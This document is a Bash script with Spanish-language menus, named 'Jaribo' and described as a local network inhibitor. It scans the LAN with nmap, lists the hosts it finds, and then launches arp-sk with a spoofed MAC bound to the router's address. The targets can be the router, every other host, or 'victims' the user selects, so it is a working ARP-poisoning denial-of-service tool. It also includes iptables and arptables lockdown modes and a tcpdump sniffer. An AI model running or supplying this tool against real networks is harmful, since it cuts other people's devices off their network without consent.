#!/bin/bash

function modo_seguro(){

	clear
	echo " )------------------------------------------------------------------------------("
	echo " )------------------------- ENTRANDO EN MODO SEGURO ----------------------------("
	echo " ) - - - - - ⌬ - - - - - - AISLANDO MÁQUINA DE LA RED - - - - - - - ⌬ - - - - - ("
	echo " )------------------------------------------------------------------------------("
	echo " )----------- Conexiónes salientes activas y salientes por el puerto 80 --------("
	echo " )------------------------------------------------------------------------------("
	echo ""

	iptables -F
	iptables -P FORWARD DROP
	iptables -P INPUT DROP
	iptables -P OUTPUT DROP

	iptables -A INPUT -p tcp --dport 80 -j ACCEPT
	iptables -A INPUT -p tcp --dport 443 -j ACCEPT

        iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
        iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT

	arptables -F
	arptables -P INPUT DROP
	arptables -P OUTPUT ACCEPT

	echo ""
        echo " )------------------------------- IPTABLES -------------------------------------("

        iptables -L -n

	echo ""
        echo " )------------------------------ ARPTABLES -------------------------------------("

        arptables -L -n

	sleep 2
	clear
}

function modo_defcon1(){

	clear
        echo " )------------------------------------------------------------------------------("
        echo " )--------------------------- ENTRANDO EN DEFCON 1 -----------------------------("
        echo " ) - - - - - ⌬ - - - - - - AISLANDO MÁQUINA DE LA RED - - - - - - - ⌬ - - - - - ("
        echo " )------------------------------------------------------------------------------("
        echo " )----------------------- Conexiónes salientes activas -------------------------("
        echo " )------------------------------------------------------------------------------("

	echo ""

	iptables -F
	iptables -P FORWARD DROP
	iptables -P INPUT DROP
	iptables -P OUTPUT DROP

	arptables -F
        arptables -P INPUT DROP
        arptables -P OUTPUT ACCEPT

	echo ""
        echo " )------------------------------- IPTABLES -------------------------------------("

        iptables -L -n

	echo ""
        echo " )------------------------------ ARPTABLES -------------------------------------("

        arptables -L -n

	sleep 2
	clear
}

function modo_abierto(){

	clear
        echo " )------------------------------------------------------------------------------("
        echo " )-------------------------- RESTAURANDO CONEXIONES ----------------------------("
        echo " ) - - - - - ⌬ - - - - - ABRIENDO CONEXIONES A LA RED - - - - - - - ⌬ - - - - - ("
        echo " )------------------------------------------------------------------------------("
        echo " )----------------- Conexiónes entrantes y salientes activas -------------------("
        echo " )------------------------------------------------------------------------------("
	echo ""

	iptables -F
	iptables -P FORWARD ACCEPT
	iptables -P INPUT ACCEPT
	iptables -P OUTPUT ACCEPT

	arptables -F
        arptables -P INPUT ACCEPT
        arptables -P OUTPUT ACCEPT

	echo ""
        echo " )------------------------------- IPTABLES -------------------------------------("

        iptables -L -n

	echo ""
        echo " )------------------------------ ARPTABLES -------------------------------------("

        arptables -L -n

	sleep 2
	clear
}

function networkpanic(){

	clear
        echo " )------------------------------------------------------------------------------("
        echo " )------------------------- ENTRANDO EN MODO PANICO ----------------------------("
        echo " ) - - - - - ⌬ - - - - - - AISLANDO MÁQUINA DE LA RED - - - - - - - ⌬ - - - - - ("
        echo " )------------------------------------------------------------------------------("
        echo " )----------------------- CERRANDO TODAS LAS CONEXIONES ------------------------("
        echo " )------------------------------------------------------------------------------("
	echo ""

	iptables -F
	iptables -P FORWARD DROP
	iptables -P OUTPUT DROP
	iptables -P INPUT DROP

	arptables -F
        arptables -P INPUT DROP
        arptables -P OUTPUT DROP

	echo ""
	echo " )------------------------------- IPTABLES -------------------------------------("

        iptables -L -n

	echo ""
        echo " )------------------------------ ARPTABLES -------------------------------------("

        arptables -L -n

	sleep 2
	clear
}

function configurador_inicial(){

	clear
	echo '      ⌬                ___  ____  _____  _  __  ⌬ '
        echo '                      |   || __ || ___ \(_)|  |    '
        echo '                      |   ||(__)|| |_/ / _ |  |__  ___ ⌬ '
        echo '               ⌬      |   || __ ||    / | ||  __ |/ _ \        ⌬'
        echo '                   __ /   || || || |\ \ | || (__)| (_)                 ⌬'
        echo '     ⌬            |_______||_||_|\_| \_\|_||_____|\___/           ⌬'

	echo "+) Bienvenido al proyecto Jaribo un inhibidor de red a nivel local | v0.23("
	echo " |------------------------------------------------------------------------|"
	echo " |--------- Dime la dirección del router y la mascara de red -------------|"
	echo " |------------------------------------------------------------------------|"
	echo "-)    Puede que esta información de ayude a saber cual es la dirección    |"
	echo " |    `ifconfig | grep 'broadcast' | sed -e 's/^[ \t]*//'`"
	echo ""
	read red
	clear

        echo '     ⌬                 ___  ____  _____  _⌬ __     '
        echo '                 ⌬    |   || __ || ___ \(_)|  | ⌬  '
        echo '                      |   ||(__)|| |_/ / _ |  |__  ___   '
        echo '        ⌬             |   || __ ||    / | ||  __ |/ _ \               ⌬'
        echo '                   __ /   || || || |\ \ | || (__)| (_)      ⌬'
        echo '                  |_______||_||_|\_| \_\|_||_____|\___/   ⌬'

	echo "+) Bienvenido al proyecto Jaribo un inhibidor de red a nivel local | v0.23("
	echo " )------------------------------------------------------------------------("
	echo " |---------------------- Dime el adaptador de red ------------------------|"
	netstat -i
	echo ""

        netstat -i
        echo ""
        read ether

	clear
}


configurador_inicial #Acceso a la funcion de arriba.

while [ true ]
do
echo " --------------------------------------------------------------------------"
echo " ) Bienvenido al proyecto Jaribo un inhibidor de red a nivel local | v0.23("
echo " |------------------------------------------------------------------------|"
echo " |--------> Consolas de supresión apuntando a '$red' desde '$ether'"
echo " |------------------------------------------------------------------------|"
echo " |- 0) Refrescar las conexiones.                                          |"
echo " |- 1) Mostrar a los JARIBOS.                                             |"
echo " |- 2) Inhibir toda la red.                                               |"
echo " |- 3) Vaciar red.                                                        |"
echo " |- 4) Inhibir un nodo específico.                                        |"
echo " |- 5) Reconfigurar red y adaptador.                                      |"
echo " |- 6) Muestra el valor de las variables.                                 |"
echo " |-*7) Entrar en modo seguro.                                             |"
echo " |-*8) Entrar en modo DEFCON 1.                                           |"
echo " |-*9) Entrar en modo 'PANICO EN RED'.                                    |"
echo " |-*10) Entrar en modo abierto.                                           |"
echo " |- 11) Muestra iptables y arptables.                                     |"
echo " |- 12) Muestra posibles ataques salientes o entrantes.                   |"
echo " |------------------------------------------------------------------------|"
echo " |- Intro) Salir.                           Proyecto Jarius, Vers. Kellis |"
echo " )------------------------------------------------------------------------("

 #Genera variables a usando los datos itroducidos

router=`echo $red | cut -d "/" -f 1`

if [ -e Usuarios_en_red.txt ]; # revisa si Usuarios_en_red.txt existe
	then
		mrouter=`cat Usuarios_en_red.txt | cut -d " " -f 3 | awk NR==1`
	else
		echo "!)--> Atención, ¡ lista de usuarios no detectada !"
fi

read opt

clear

if [ -z "$opt" ]
	then
		exit
fi

case $opt in #Empieza en case
0) #Actualiza la lista de Usuarios_en_Red

	echo "0)----------------------------ACTUALIZANDO LISTA--------------------------------("
	echo "|---  |  ---  |   ---  |  ---  _  ---  _  ---  _  ---   |  ---  |   ---  |   ---|"
	nmap -sP $red | grep "MAC" > Usuarios_en_red.txt #guarda las lineas de la salida del nmap que coinciden con la palara MAC
	echo "|    ---     ---      ---     LISTA ACTUALIZADA        ---     ---      ---     |"
	echo "|---  |  ---  |   ---  |  ---  _  ---  _  ---  _  ---   |  ---  |   ---  |   ---|"
	echo "-)------------------------------------------------------------------------------("
	sleep 1
	clear
;;

1) #Muestra Uusarios_en_red

	echo "1)--------------------------- JARIBOS ------------------------------------("
	cat Usuarios_en_red.txt | nl -ba

;;

2) #Peta el router

	clear
	echo "2)--------------------⌬ SUPRESIÓN SOBRE ROUTER ⌬ -------------------------("
	echo "⌬)---------------- ACCIONANDO CONSOLA  SOBRE '$mrouter' ---------("
	xterm -e arp-sk -T u0 -r -i $ether -S $router:AA:BB:CC:DD:EE:FF -s $mrouter &
	echo "i) Apreta intro para cancelar la supresión."
	read
	killall arp-sk
;;

3) #Peta toda la red menos tu y el router - DE MOMENTO NO FUNSIONA

	echo "3)----------------- SUPRESIÓN MASIVA EN EJECUCIÓN ------------------------("
	echo "⌬)----- SUPRESIÓN MASIVA DETECTADA, ACCIONANDO CONSOLAS SECUNDARIAS ------("
	echo "-)------------------------------------------------------------------------("
	for mac in `cat Usuarios_en_red.txt | grep "MAC" | cut -d " " -f 3`;
	do
		if [ "$mac" != "$mrouter" ];
			then
			xterm -e arp-sk -T u0 -r -i $ether -S $router:AA:BB:CC:DD:EE:FF -s $mac & PIDE=$!
			echo "⌬ > EJECUTANDO CONSOLA $PIDE > ACCIONANDO SUPRESIÓN SOBRE $mac"
		fi
	done
	echo "-)------------------------------------------------------------------------("
	echo "i) Apreta intro para cancelar la supresión."
	read
	killall arp-sk
;;

4) #Peta jaribo especifico

	clear
	echo "-)------------------------------------------------------------------------("
	cat Usuarios_en_red.txt | nl -ba
	echo "-)------------------------------------------------------------------------("
	echo "2) Seleccione  a  las  víctimas, presione intro  para salir del modulo ---("
	macvic=""
	read macvic
	if [ -n "$macvic" ];  #si apreta intro vuelve al menú
		then
			clear
			echo ""
			for i in $macvic;
			do
				echo "-)------------------------------------------------------------------------("
				mac=`cat Usuarios_en_red.txt | cut -d " " -f 3 |awk NR==$i`
				xterm -e arp-sk -T u0 -r -i $ether -S $router:AA:BB:CC:DD:EE:FF -s $mac & PIDE=$!
				echo "⌬)-------------- ACCIONANDO CONSOLA $PIDE SOBRE '$mac' -------("
				echo "⌬) Nombre del Objetivo > (`cat Usuarios_en_red.txt | cut -d '(' -f 2 | awk NR==$i`"
				echo "-)------------------------------------------------------------------------("
				echo ""
			done
			echo "i) Apreta intro para cancelar la supresión."
			read
			killall arp-sk
			macvic=""
		else
			clear
	fi
;;

5) # llama a la funcion de reconfiguración

	clear
	configurador_inicial
;;

6) # Muestra los valores de las variables, se usa para identificar problemas de configuración u programación

	echo "6)------------------------------------------------------------------------("
	echo "| red     = '$red' --> Se usa para identificar la red y la ip del router"
	echo "| ether   = '$ether' --> Se usa para identificar el adaptador de salida"
	echo "| router  = '$router' --> Se usa para identificar la ip del Router"
	echo "| mrouter = '$mrouter' --> Se usa para identificar la mac del router"
	echo "| ownmac  = '$ownmac' --> Se usa para idenfiticar la mac del cliente"
	echo "| mac     = '$mac' --> Se usa para identificar la mac de la victima"
;;

7)
	modo_seguro
;;

8)
	modo_defcon1
;;

9)
	networkpanic
;;

10)
	modo_abierto
;;

11)
        echo " )------------------------------- IPTABLES -------------------------------------("

        iptables -L -n

	echo ""
        echo " )------------------------------ ARPTABLES -------------------------------------("

        arptables -L -n

;;

12)

	echo " |-----> Snifador de ataques. "
	echo " |------------------------------------------------------------------------|"
	echo " |- 1) Iniciar esnifeo .                                                  |"
	echo " |- 2) Cancelar esnifeo.                                                  |"
	echo " |------------------------------------------------------------------------|"

	read opt2
	if [ $opt2 -eq 2 ];
		then
			killall tcpdump
			clear
		else
			xterm -e tcpdump -ennqti $ether \( arp or icmp \) &
			clear
	fi
;;

esac #final del case


done #final del bucle

export ESAC_INITIAL_STATUS_CONSTANT=1
